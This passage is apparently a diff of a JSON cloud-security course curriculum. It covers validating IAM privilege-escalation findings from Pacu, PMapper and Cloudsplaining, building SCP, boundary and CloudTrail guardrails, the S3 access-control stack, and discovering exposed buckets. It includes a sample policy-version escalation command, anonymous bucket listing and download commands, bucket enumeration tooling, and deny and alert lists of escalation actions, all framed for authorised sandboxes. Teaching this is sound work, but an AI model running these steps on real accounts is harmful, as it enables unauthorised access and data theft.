+            "body": "Automated tools report *potential* paths from static or enumerated permissions; they do not always account for SCPs, permission boundaries, missing trust relationships, or conditions. **You must validate** before reporting.\n\nFalse-positive sources:\n- A boundary or SCP denies the action even though the identity policy allows it (tool saw only the identity policy).\n- `iam:PassRole` is present but no role actually trusts a service you can create.\n- A condition key (`aws:SourceIp`, MFA, `ExternalId`) blocks the path in practice.\n- The 'admin' role the tool flagged no longer has its policy.\n\nValidation = attempt the actual exploit in your authorised sandbox (or a careful read-only dry run), observe success or `AccessDenied`, and only report confirmed edges. This mirrors the hunting-core discipline: a weak automated finding gets validated, then killed or escalated — never reported raw.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "tool",
+                  "label": "Tool flags path",
+                  "highlighted": true
+                },
+                {
+                  "id": "boundary",
+                  "label": "Boundary/SCP denies?"
+                },
+                {
+                  "id": "trust",
+                  "label": "Role trusts service?"
+                },
+                {
+                  "id": "cond",
+                  "label": "Condition blocks?"
+                },
+                {
+                  "id": "confirm",
+                  "label": "Confirmed finding",
+                  "highlighted": true
+                },
+                {
+                  "id": "kill",
+                  "label": "False positive -> kill"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "tool",
+                  "to": "boundary",
+                  "label": "check"
+                },
+                {
+                  "from": "boundary",
+                  "to": "trust",
+                  "label": "no deny"
+                },
+                {
+                  "from": "trust",
+                  "to": "cond",
+                  "label": "trusts"
+                },
+                {
+                  "from": "cond",
+                  "to": "confirm",
+                  "label": "no block"
+                },
+                {
+                  "from": "boundary",
+                  "to": "kill",
+                  "label": "denied"
+                },
+                {
+                  "from": "cond",
+                  "to": "kill",
+                  "label": "blocked"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — Automated Escalation Discovery lab",
+            "body": "This lab has you run the tooling against a sandbox, then validate each hit by hand.\n\nHands-on steps:\n1. Deploy a CloudGoat IAM privesc scenario (or your own weak principal) into your sandbox account.\n2. Run **Pacu** `iam__enum_permissions` then `iam__privesc_scan`; note the flagged method.\n3. Run **PMapper**: `pmapper graph create`, then a privesc query for your principal; confirm it finds the same edge (and visualise the graph if you like).\n4. Export `get-account-authorization-details` and run **Cloudsplaining**; review the HTML for the same policy.\n5. **Validate**: actually perform the escalation; if it succeeds, it is real. If `AccessDenied`, investigate which boundary/SCP/condition killed it and mark it a false positive.\n6. Report the single exact edge and the **one-line policy fix** (per the hunting-core 'report the exact edge and the one-line policy fix' discipline).",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Pacu privesc_scan",
+                  "detail": "Flag exploitable permission"
+                },
+                {
+                  "label": "PMapper query",
+                  "detail": "Confirm account-wide path"
+                },
+                {
+                  "label": "Cloudsplaining",
+                  "detail": "Static policy cross-check"
+                },
+                {
+                  "label": "Validate + report",
+                  "detail": "Exact edge + one-line fix"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend with the same tools",
+            "body": "These offensive tools are also excellent **defensive** instruments — run them yourself before an attacker does.\n\n- **Cloudsplaining** in CI/CD: scan the account's authorization details on a schedule and fail/alert when a policy introduces a privilege-escalation, resource-exposure or data-exfiltration path. It is purely read-only (one IAM call), so it is safe to automate.\n- **PMapper** to continuously verify that no non-admin principal can reach admin; run `pmapper query 'preset privesc'` as a guardrail check after IAM changes.\n- Combine with **IAM Access Analyzer** (external access + unused access findings) and **AWS IAM Access Advisor** (last-accessed data) to right-size permissions and remove the very edges these tools find.\n- Treat any new escalation edge the tools report as a bug to fix with the one-line policy change (scope `PassRole`, remove `iam:Create*Version`, tighten a trust policy), then re-scan to confirm the edge is gone.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Offensive use",
+                  "points": [
+                    "Find my path to admin",
+                    "Pacu exploits it",
+                    "One target principal"
+                  ]
+                },
+                {
+                  "label": "Defensive use",
+                  "points": [
+                    "Cloudsplaining in CI",
+                    "PMapper guardrail after changes",
+                    "Access Analyzer + Access Advisor",
+                    "Fix edge, re-scan to verify"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Real AWS accounts are too large to audit by hand — hundreds of roles, deep AssumeRole chains, and PassRole edges that a human reviewer will miss. Automated discovery is what makes IAM escalation hunting tractable at scale, for both attackers and defenders.\n\nFor hunters, these tools turn a day of manual enumeration into minutes and surface non-obvious multi-hop paths (A assumes B, B passes a role to Lambda, Lambda is admin) that are invisible when reading one policy at a time. For defenders, running the *same* tools continuously is one of the highest-value IAM controls available: you find and close escalation edges before anyone exploits them.\n\nThe discipline that separates a professional from a scanner-runner is **validation**: automated output is a lead, not a finding. Confirming the exact exploitable edge — and reporting it with the precise one-line fix — is what makes the work credible and actionable.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Huge IAM account",
+                  "detail": "Hundreds of principals"
+                },
+                {
+                  "label": "Automated mapping",
+                  "detail": "Pacu / PMapper / Cloudsplaining"
+                },
+                {
+                  "label": "Multi-hop paths found",
+                  "detail": "Invisible to manual review"
+                },
+                {
+                  "label": "Validate + fix",
+                  "detail": "Exact edge, one-line policy change"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m4-7",
+        "moduleId": "cloud-m4",
+        "number": 27,
+        "title": "Defending Identity",
+        "type": "exercise",
+        "week": 2,
+        "description": "Every attack mapped to a defence. Students build a guardrail set that neutralises the module's escalations and verify it blocks their own earlier exploits.",
+        "keyPoints": [
+          "SCPs denying iam:* escalation actions to non-admin principals",
+          "Permission boundaries on all developer/CI roles",
+          "Access Analyzer external-access findings for unintended cross-account trust",
+          "Condition keys: aws:PrincipalOrgID, MFA, SourceIp on sensitive actions",
+          "Alerting on the specific CloudTrail escalation events"
+        ],
+        "slides": [
+          {
+            "title": "What 'defending identity' means",
+            "body": "This capstone topic flips every attack in the module into a concrete control. The thesis: in the cloud there is no network perimeter to hide behind — **identity is the perimeter** — so defence is about constraining what each principal can do and detecting when those constraints are tested.\n\nAnalogy: you cannot wall off the building because everyone works remotely with keycards. So instead you (1) give each badge the fewest doors it needs, (2) put a hard ceiling on what *any* badge can ever open no matter what's added to it, (3) watch the door logs for the exact suspicious swipes, and (4) require a second factor for the vault.\n\nConcretely that maps to four pillars you assemble here: **SCPs** (org-wide denies), **permission boundaries** (per-principal ceilings), **condition keys** (context requirements like MFA and PrincipalOrgID), and **detection** (Access Analyzer + CloudTrail alerting). The goal is a guardrail set that blocks your own earlier exploits.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "id",
+                  "label": "Identity = perimeter",
+                  "highlighted": true
+                },
+                {
+                  "id": "scp",
+                  "label": "SCPs (org denies)"
+                },
+                {
+                  "id": "pb",
+                  "label": "Permission boundaries (ceilings)"
+                },
+                {
+                  "id": "cond",
+                  "label": "Condition keys (MFA/OrgID/IP)"
+                },
+                {
+                  "id": "det",
+                  "label": "Detection (Analyzer+CloudTrail)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "id",
+                  "to": "scp",
+                  "label": "prevent"
+                },
+                {
+                  "from": "id",
+                  "to": "pb",
+                  "label": "cap"
+                },
+                {
+                  "from": "id",
+                  "to": "cond",
+                  "label": "require context"
+                },
+                {
+                  "from": "id",
+                  "to": "det",
+                  "label": "catch"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How the controls compose (the AND rule)",
+            "body": "The reason these controls are powerful is that AWS evaluates them with **AND** logic: for an action to be allowed, it must be permitted by the identity policy **and** not denied by any SCP **and** within the permission boundary **and** satisfy every condition. Any one of them can veto.\n\nThis is why a defender wins even when an identity policy is too broad:\n\n- An **SCP** `Deny` on `iam:CreatePolicyVersion` stops that escalation for everyone it applies to, regardless of their identity policy.\n- A **permission boundary** that simply does not include `iam:*` means attaching AdministratorAccess to a bounded user grants nothing extra.\n- A **condition** like `aws:MultiFactorAuthPresent: true` on sensitive actions means a stolen key without MFA cannot use them.\n\nEffective permissions = (identity ∩ boundary) ∩ (not SCP-denied) ∩ (conditions met). The escalation catalogue assumed only the identity policy mattered; these controls break that assumption.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Identity policy allows?",
+                  "detail": "Necessary, not sufficient"
+                },
+                {
+                  "label": "SCP not denying?",
+                  "detail": "Org-wide veto"
+                },
+                {
+                  "label": "Within boundary?",
+                  "detail": "Per-principal ceiling"
+                },
+                {
+                  "label": "Conditions met?",
+                  "detail": "MFA / OrgID / IP -> ALLOW"
+                }
+              ]
+            },
+            "check": {
+              "question": "A developer role's identity policy allows iam:AttachUserPolicy, but an SCP on its account denies all iam write actions for non-admins. What happens when the role tries to attach AdministratorAccess?",
+              "options": [
+                "It is denied — an SCP Deny overrides the identity policy's Allow",
+                "It succeeds, because identity policies always win",
+                "It succeeds only if MFA is present",
+                "The SCP is ignored for existing roles"
+              ],
+              "correctIndex": 0,
+              "explanation": "Permissions are evaluated with AND logic and an explicit Deny (including in an SCP) always overrides an Allow. The SCP vetoes the action regardless of the identity policy, neutralising the escalation."
+            }
+          },
+          {
+            "title": "Worked example: an anti-escalation SCP",
+            "body": "A single SCP, attached to the developer/workload OU, denies the escalation verbs from the catalogue for everyone except a tagged break-glass admin. This one policy neutralises most of topics 1–5 at once.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "cat deny-iam-escalation.json",
+                  "output": "{\"Effect\":\"Deny\",\"Action\":[\"iam:CreatePolicyVersion\",\"iam:SetDefaultPolicyVersion\",\"iam:AttachUserPolicy\",\"iam:PutUserPolicy\",\"iam:AttachRolePolicy\",\"iam:UpdateAssumeRolePolicy\",\"iam:CreateAccessKey\",\"iam:CreateLoginProfile\"],\"Resource\":\"*\",\"Condition\":{\"StringNotEquals\":{\"aws:PrincipalTag/role\":\"breakglass-admin\"}}}"
+                },
+                {
+                  "command": "aws organizations create-policy --name DenyIAMEscalation --type SERVICE_CONTROL_POLICY --content file://deny-iam-escalation.json",
+                  "output": "Policy: p-escdeny01"
+                },
+                {
+                  "command": "aws organizations attach-policy --policy-id p-escdeny01 --target-id ou-dev-1234",
+                  "output": "(attached to Dev OU)"
+                },
+                {
+                  "command": "# re-run topic-1 exploit as dev-ci:",
+                  "output": ""
+                },
+                {
+                  "command": "aws iam create-policy-version --policy-arn ...:policy/CI-Deploy-Policy --policy-document file://admin.json --set-as-default",
+                  "output": "AccessDenied: explicit deny in a service control policy  <- exploit blocked"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Permission boundaries and condition keys",
+            "body": "SCPs are org-wide and blunt; **permission boundaries** give per-principal precision. A boundary is a managed policy that sets the *maximum* permissions a principal can ever have. Attach one to every developer and CI role.\n\nExample: a boundary that allows the services the role needs but **omits all `iam:*` write actions** means even if the role (or an attacker) attaches AdministratorAccess, the effective permission is still capped — no IAM escalation possible.\n\n**Condition keys** add context requirements:\n- `aws:PrincipalOrgID` — only principals in your Org can assume internal roles (kills cross-account trust mistakes from topic 3).\n- `aws:MultiFactorAuthPresent` / `aws:MultiFactorAuthAge` — sensitive actions require fresh MFA, so a stolen API key alone is not enough.\n- `aws:SourceIp` / `aws:VpcSourceIp` — restrict sensitive actions to corporate ranges.\n- `sts:ExternalId` — required on vendor roles to stop confused deputies (topic 3).\n\nBoundaries cap *what*; conditions require *context*. Used together they shrink the exploitable surface dramatically.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Permission boundary",
+                  "points": [
+                    "Per-principal ceiling",
+                    "Omit iam:* writes",
+                    "Caps attached admin policies"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Condition keys",
+                  "points": [
+                    "aws:PrincipalOrgID",
+                    "MFA present/age",
+                    "SourceIp / ExternalId"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "Detection: Access Analyzer and CloudTrail",
+            "body": "Prevention is never perfect, so defence-in-depth adds detection tuned to this module's exact attacks.\n\n- **IAM Access Analyzer** (external access): continuously reports any role, bucket, key, secret or function whose policy grants access *outside* your account/Org — directly catching the over-broad trust (topic 3) and resource policies (topic 4). Access Analyzer also has **unused access** findings to prune dormant over-permissions.\n- **CloudTrail alerting** on the specific escalation/persistence events: `CreatePolicyVersion`, `AttachUserPolicy`, `PutUserPolicy`, `UpdateAssumeRolePolicy`, `PassRole`-driven `CreateFunction`/`RunInstances`, `CreateAccessKey`, `CreateLoginProfile`, `PutKeyPolicy`. Wire these to EventBridge → SNS/Lambda for real-time alerts, backed by GuardDuty findings like `PrivilegeEscalation:IAMUser/AdministrativePermissions`.\n\nThe skill is **specificity**: you alert on the exact API calls your exploits generate, not generic noise, so a real escalation attempt stands out immediately.",
+            "diagram": {
+              "type": "request-response",
+              "leftLabel": "Attacker",
+              "rightLabel": "AWS + detection",
+              "exchanges": [
+                {
+                  "direction": "right",
+                  "label": "UpdateAssumeRolePolicy",
+                  "payload": "make prod-admin-role trust me"
+                },
+                {
+                  "direction": "left",
+                  "label": "CloudTrail event -> EventBridge rule matches",
+                  "payload": "eventName=UpdateAssumeRolePolicy"
+                },
+                {
+                  "direction": "left",
+                  "label": "SNS alert + Access Analyzer external-trust finding",
+                  "payload": "Alert: role now trusts external principal"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — Defending Identity exercise",
+            "body": "The capstone exercise: build a guardrail set that neutralises the module's escalations and **verify it blocks your own earlier exploits**.\n\nHands-on steps (goal-driven — each control must demonstrably stop a specific prior attack):\n1. Author and attach the **anti-escalation SCP** (deny the catalogue verbs for non-admins). Re-run the topic-1 CreatePolicyVersion exploit → expect `AccessDenied`.\n2. Attach a **permission boundary** omitting `iam:*` to the dev/CI roles. Re-run the topic-2 PassRole-to-Lambda chain → the Lambda's attempt to escalate your user is capped.\n3. Add `aws:PrincipalOrgID` to internal role trust policies and `ExternalId` to any vendor role. Re-run the topic-3 trust breakout from an outside principal → `AccessDenied`.\n4. Tighten KMS/Secrets resource policies to exact principals; enable **Access Analyzer** and confirm the topic-4 external-access finding clears.\n5. Add CloudTrail/EventBridge alerts for the persistence events from topic 5; re-plant a second key and confirm the alert fires.\n\nSuccess criterion: every exploit you performed earlier now fails or is detected. That is the verification loop.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Attach SCP",
+                  "detail": "Deny escalation verbs -> re-test topic 1"
+                },
+                {
+                  "label": "Attach boundary",
+                  "detail": "Omit iam:* -> re-test topic 2"
+                },
+                {
+                  "label": "Add conditions",
+                  "detail": "OrgID/ExternalId -> re-test topic 3"
+                },
+                {
+                  "label": "Verify detection",
+                  "detail": "Analyzer + alerts -> topics 4-5"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Harden further and avoid pitfalls",
+            "body": "A few nuances separate a real guardrail set from a checkbox:\n\n- **Break-glass path**: your denies must exempt a tightly controlled, MFA-gated, heavily-audited admin, or you can lock yourself out. Tag-based or dedicated-account break-glass is standard.\n- **SCPs don't affect the management account** and don't grant anything — they only deny. Design them as denies, test in a non-prod OU first.\n- **Boundaries must be attached everywhere** to matter — one unbounded admin-capable role undoes the scheme. Enforce boundary attachment via SCP (`iam:CreateRole`/`CreateUser` requires a boundary via `iam:PermissionsBoundary` condition).\n- **Prune continuously**: Access Analyzer unused-access + Access Advisor last-accessed data to remove permissions nobody uses.\n- **Don't put secrets or authz logic in system/role config that leaks** — tie back to least privilege.\n- **Alert fatigue**: scope detections to the exact high-signal events, auto-remediate where safe.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Pitfall",
+                  "points": [
+                    "No break-glass -> lockout",
+                    "Boundary not enforced",
+                    "SCP tested in prod first",
+                    "Generic alerts -> fatigue"
+                  ]
+                },
+                {
+                  "label": "Done right",
+                  "points": [
+                    "MFA-gated break-glass",
+                    "SCP forces boundary on CreateRole/User",
+                    "Test in non-prod OU",
+                    "Specific high-signal alerts + auto-remediate"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Attack skills without defensive mastery are half a profession. The whole point of learning the escalation catalogue, PassRole abuse, trust breakouts, resource-policy exposure and persistence is to be able to **close** them — precisely, verifiably, and at scale. This topic is where you prove each exploit has a one-line (or one-policy) antidote.\n\nThe composition insight — that SCPs, boundaries and conditions veto with AND logic — is the single most important defensive idea in AWS IAM. It means a defender does not have to make every identity policy perfect; a well-placed boundary or SCP neutralises whole classes of over-permission at once. That is leverage attackers cannot match.\n\nFor a hunter, understanding these controls makes your reports credible: you don't just show the break, you hand over the exact SCP/boundary/condition that fixes it — the 'report the exact edge and the one-line policy fix' discipline. For a defender, this guardrail set is a reusable template you apply to every account you own.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Every attack in module",
+                  "detail": "Topics 1-6"
+                },
+                {
+                  "label": "Mapped to a control",
+                  "detail": "SCP / boundary / condition / detection"
+                },
+                {
+                  "label": "Verified blocking",
+                  "detail": "Re-run exploit -> AccessDenied/alert"
+                },
+                {
+                  "label": "Reusable guardrail set",
+                  "detail": "Applied to every account"
+                }
+              ]
+            }
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "cloud-m5",
+    "name": "Storage Security & Data Exposure",
+    "shortName": "Storage & Data Exposure",
+    "month": 2,
+    "weeks": [
+      2
+    ],
+    "description": "Object storage is where the data lives and where the headline breaches happen. This module covers S3 (and Blob/GCS) access control in depth, public-exposure discovery, pre-signed URL abuse, and the encryption and access controls that keep buckets private.",
+    "estimatedHours": 11,
+    "outcomes": [
+      "Explain the full S3 access-control stack: ACLs, bucket policies, IAM, Block Public Access, Access Points",
+      "Discover and responsibly validate publicly exposed buckets and objects",
+      "Identify data-exposure paths via pre-signed URLs, snapshots, backups and misconfigured replication",
+      "Design storage encryption (SSE-KMS, bucket keys) and access controls that enforce least privilege"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m5-1",
+        "moduleId": "cloud-m5",
+        "number": 28,
+        "title": "The S3 Access-Control Stack",
+        "type": "theory",
+        "week": 2,
+        "description": "S3 has four overlapping access mechanisms and getting any one wrong exposes data. Students learn how ACLs, bucket policies, IAM and Block Public Access combine.",
+        "keyPoints": [
+          "Bucket & object ACLs (legacy) vs bucket policies vs IAM policies",
+          "Block Public Access as the account- and bucket-level safety net",
+          "'Public' really means AllUsers / AuthenticatedUsers grantees and policy with Principal '*'",
+          "Object Ownership / ACLs-disabled as the modern default",
+          "S3 Access Points and multi-region access points for scoped access"
+        ],
+        "slides": [
+          {
+            "title": "What the S3 Access-Control Stack Is",
+            "body": "Amazon S3 stores your files (called 'objects') inside containers (called 'buckets'). Who can read or write those objects is decided by not one lock but four overlapping mechanisms that all run at once: ACLs, bucket policies, IAM policies, and Block Public Access.\n\nAnalogy: imagine one door with four different locks installed by four different contractors. Leaving any single lock unlocked can open the door, even if the other three are bolted. Most famous S3 breaches were not a 'hack' at all - someone simply left one lock open. Understanding how the four combine is the whole game."
+          },
+          {
+            "title": "The Four Layers",
+            "body": "Each layer answers 'who can touch this data?' in its own way:\n\n- ACLs (Access Control Lists): the oldest, simplest grant model, attached to a bucket or a single object. Grants to coarse groups. AWS now recommends turning these off.\n- Bucket policy: a JSON document on the bucket. Can grant access to anyone, including 'everyone on the internet' (Principal: *).\n- IAM policy: attached to a user or role in your account, saying what that identity may do.\n- Block Public Access (BPA): a master safety net that can override the others and refuse any public grant.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "bpa",
+                  "label": "Block Public Access (safety net)",
+                  "highlighted": true
+                },
+                {
+                  "id": "bucket",
+                  "label": "Bucket policy (JSON on bucket)"
+                },
+                {
+                  "id": "iam",
+                  "label": "IAM policy (on user/role)"
+                },
+                {
+                  "id": "acl",
+                  "label": "ACLs (legacy, per-bucket/object)"
+                },
+                {
+                  "id": "obj",
+                  "label": "Your objects (the data)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "bpa",
+                  "to": "bucket",
+                  "label": "can veto"
+                },
+                {
+                  "from": "bucket",
+                  "to": "obj",
+                  "label": "grants"
+                },
+                {
+                  "from": "iam",
+                  "to": "obj",
+                  "label": "grants"
+                },
+                {
+                  "from": "acl",
+                  "to": "obj",
+                  "label": "grants"
+                }
+              ]
+            }
+          },
+          {
+            "title": "What 'Public' Actually Means",
+            "body": "'Public' is not a vague word in S3 - it has an exact definition. A bucket or object is public when EITHER:\n\n- An ACL grants to the special groups AllUsers (literally anyone on the internet) or AuthenticatedUsers (anyone with ANY AWS account - not just yours!), OR\n- A bucket policy allows an action with \"Principal\": \"*\" and no condition that restricts it.\n\nThe AuthenticatedUsers trap bites people constantly: it does not mean 'users authenticated to my app'. It means any of the tens of millions of AWS account holders worldwide. That is effectively public.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Private (good)",
+                  "points": [
+                    "No Principal: *",
+                    "No AllUsers / AuthenticatedUsers grant",
+                    "Access only via named IAM roles"
+                  ]
+                },
+                {
+                  "label": "Public (danger)",
+                  "points": [
+                    "Bucket policy Principal: *",
+                    "ACL grant to AllUsers",
+                    "ACL grant to AuthenticatedUsers (any AWS account)"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How a Request Is Evaluated",
+            "body": "When a GetObject request arrives, S3 does not just check one lock. It combines all the layers with a few firm rules:\n\n1. If Block Public Access applies and the grant is public, the request is denied up front.\n2. Any explicit Deny (in a bucket policy, IAM policy, or SCP) wins over everything.\n3. Otherwise, access is allowed if at least one layer grants it (IAM OR bucket policy OR ACL).\n\nSo access is the UNION of allows, minus any deny, minus BPA. This is why a locked-down IAM policy does not save you if the bucket policy says Principal: *.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Request arrives",
+                  "detail": "e.g. GET object"
+                },
+                {
+                  "label": "Block Public Access?",
+                  "detail": "public grant -> DENY immediately"
+                },
+                {
+                  "label": "Explicit Deny?",
+                  "detail": "any policy Deny -> DENY"
+                },
+                {
+                  "label": "Any Allow?",
+                  "detail": "IAM OR bucket policy OR ACL"
+                },
+                {
+                  "label": "Decision",
+                  "detail": "Allow only if a grant exists and nothing denied"
+                }
+              ]
+            },
+            "check": {
+              "question": "An object's bucket policy has \"Principal\": \"*\" allowing GetObject, but your IAM policy does NOT grant you S3 access. Block Public Access is OFF. Can an anonymous internet user read the object?",
+              "options": [
+                "No - IAM must also allow it",
+                "Yes - the bucket policy grants public access and nothing denies it",
+                "No - ACLs are required for public access",
+                "Only if the user has an AWS account"
+              ],
+              "correctIndex": 1,
+              "explanation": "Access is the union of allows. The bucket policy alone grants anonymous read; IAM only governs identities in YOUR account, not anonymous callers. With BPA off and no deny, the object is public."
+            }
+          },
+          {
+            "title": "Worked Example: Reading a Public Object",
+            "body": "You can test exposure with the AWS CLI. The --no-sign-request flag sends the request with NO credentials, exactly like an anonymous internet user. If that succeeds, the data is truly public.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 ls s3://acme-reports --no-sign-request",
+                  "output": "2026-03-01 09:12:44   2048102 q1-financials.pdf\n2026-03-02 14:03:11    518922 customer-list.csv"
+                },
+                {
+                  "command": "aws s3 cp s3://acme-reports/customer-list.csv . --no-sign-request",
+                  "output": "download: s3://acme-reports/customer-list.csv to ./customer-list.csv"
+                },
+                {
+                  "command": "head -1 customer-list.csv",
+                  "output": "email,full_name,plan,mrr   <-- anonymous read succeeded: data is PUBLIC"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Object Ownership and ACLs-Disabled",
+            "body": "ACLs are the error-prone legacy layer. In 2023 AWS changed the default for new buckets to 'Bucket owner enforced', which DISABLES ACLs entirely. Access is then controlled only by IAM and bucket policies - far simpler to reason about.\n\nThe setting is called Object Ownership. 'Bucket owner enforced' means the bucket owner automatically owns every object and ACLs are ignored. For almost all modern workloads this is the right choice: fewer locks means fewer ways to leave one open. You only keep ACLs on if a legacy integration (like a third party writing objects it must own) truly needs them."
+          },
+          {
+            "title": "Access Points for Scoped Access",
+            "body": "A big bucket shared by many apps often ends up with one giant, over-permissive bucket policy. S3 Access Points fix this: each is a named network endpoint with its OWN policy, pointed at the same bucket.\n\nSo the analytics team gets an access point that can only read the /analytics/ prefix, while the uploads service gets one that can only write /uploads/. The bucket policy stays simple and each consumer has a tightly scoped door. Multi-Region Access Points extend the idea across regions for latency and failover. This is least privilege applied to storage."
+          },
+          {
+            "title": "Defend: Turn On Block Public Access",
+            "body": "The single highest-value control is enabling Block Public Access at the ACCOUNT level, which stops any bucket from being made public regardless of its own policy. Enable it account-wide, then only grant exceptions through deliberate mechanisms like CloudFront.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3control put-public-access-block --account-id 111122223333 \\\n  --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true",
+                  "output": "(no output = success; all four switches now ON account-wide)"
+                },
+                {
+                  "command": "aws s3 ls s3://acme-reports --no-sign-request",
+                  "output": "An error occurred (AccessDenied) when calling the ListObjectsV2 operation"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Almost every 'data breach of millions of records' involving S3 traces back to this stack being misunderstood - a bucket policy with Principal: *, an AuthenticatedUsers ACL, or Block Public Access left off. No exploit, no malware, just a wrong grant.\n\nMaster the four layers and their union-of-allows evaluation and you can both find exposed data as a tester and prevent it as a defender. The CIS AWS Benchmark and the AWS Foundational Security Best Practices both make account-level Block Public Access and ACLs-disabled mandatory baseline controls."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m5-2",
+        "moduleId": "cloud-m5",
+        "number": 29,
+        "title": "Finding Exposed Storage",
+        "type": "lab",
+        "week": 2,
+        "description": "Hands-on discovery of public buckets across providers, done only against assets you own or are authorised to test.",
+        "keyPoints": [
+          "Bucket-name permutation and wordlists (S3, GCS, Azure Blob patterns)",
+          "Tools: s3scanner, cloud_enum, GCPBucketBrute",
+          "Distinguishing listable vs readable vs writable exposure",
+          "Writable public buckets = data poisoning and malware hosting risk",
+          "Reading object metadata and ACLs to confirm true exposure"
+        ],
+        "slides": [
+          {
+            "title": "What 'Finding Exposed Storage' Means",
+            "body": "Buckets live at predictable, guessable web addresses. An AWS S3 bucket named acme-backups is reachable at acme-backups.s3.amazonaws.com. There is no secret URL - the name IS the address, and names are global.\n\nAnalogy: it is like a city where every house number is a dictionary word. An attacker does not need to break in; they just read every word in the dictionary and knock on each door to see which open. 'Finding exposed storage' is the disciplined, authorised version of that knock - only ever against buckets YOU own or are explicitly permitted to test."
+          },
+          {
+            "title": "How Bucket Discovery Works",
+            "body": "Discovery is a guess-and-check loop built from a company's name plus common suffixes:\n\n1. Take a seed word (the org, product, or domain), e.g. 'acme'.\n2. Permute it with wordlists: acme-backups, acme-prod, acme-dev, acme-logs, assets-acme, acme.com-media...\n3. For each candidate, resolve the bucket address. A response that is not 'NoSuchBucket' means the name EXISTS.\n4. For existing buckets, probe what you can do: list, read, write.\n\nThe same idea applies across clouds - just the URL shape changes (shown next).",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Seed",
+                  "detail": "org / product / domain name"
+                },
+                {
+                  "label": "Permute",
+                  "detail": "prefixes + suffixes + separators"
+                },
+                {
+                  "label": "Resolve",
+                  "detail": "does the bucket name exist?"
+                },
+                {
+                  "label": "Probe",
+                  "detail": "list / read / write each hit"
+                }
+              ]
+            }
+          },
+          {
+            "title": "URL Patterns Across Providers",
+            "body": "Each cloud names its object store differently, so your permutation targets differ:\n\n- AWS S3: BUCKET.s3.amazonaws.com or BUCKET.s3.REGION.amazonaws.com\n- Google Cloud Storage: storage.googleapis.com/BUCKET or BUCKET.storage.googleapis.com\n- Azure Blob: ACCOUNT.blob.core.windows.net/CONTAINER\n\nTools automate all three so you do not hand-build URLs.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS S3",
+                  "points": [
+                    "bucket.s3.amazonaws.com",
+                    "Global names",
+                    "Tool: s3scanner"
+                  ]
+                },
+                {
+                  "label": "GCS",
+                  "points": [
+                    "storage.googleapis.com/bucket",
+                    "Global names",
+                    "Tool: GCPBucketBrute"
+                  ]
+                },
+                {
+                  "label": "Azure Blob",
+                  "points": [
+                    "account.blob.core.windows.net",
+                    "account + container",
+                    "Tool: cloud_enum"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Tools: s3scanner, cloud_enum, GCPBucketBrute",
+            "body": "You do not guess by hand. Three open-source tools cover the field:\n\n- s3scanner: feeds a wordlist of bucket names, tells you which exist and whether each is open (list/read/write). Fast, S3-focused.\n- cloud_enum: multi-cloud - enumerates AWS, Azure Blob and GCS from one keyword seed. Great first pass when you only know a company name.\n- GCPBucketBrute: specialised brute-forcer for Google Cloud Storage buckets, checks both unauthenticated and authenticated access levels.\n\nAll three only tell you what is reachable; they do not exploit. The judgement of what to do with a hit is yours."
+          },
+          {
+            "title": "How Access Levels Differ",
+            "body": "A bucket that 'exists' is not automatically a finding. There are three very different levels of exposure, and you must distinguish them precisely:\n\n- LISTABLE: you can see the names of the objects (a directory listing). Metadata leak, but you may not get the contents.\n- READABLE: you can download the object contents. This is the data breach.\n- WRITABLE: you can upload or overwrite objects. This is often WORSE than read - you can plant malware, deface a site served from the bucket, or poison data a pipeline trusts.\n\nMany reports confuse 'I can list the bucket' with 'I read the data'. Be exact; it changes the severity.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "exists",
+                  "label": "Bucket exists"
+                },
+                {
+                  "id": "list",
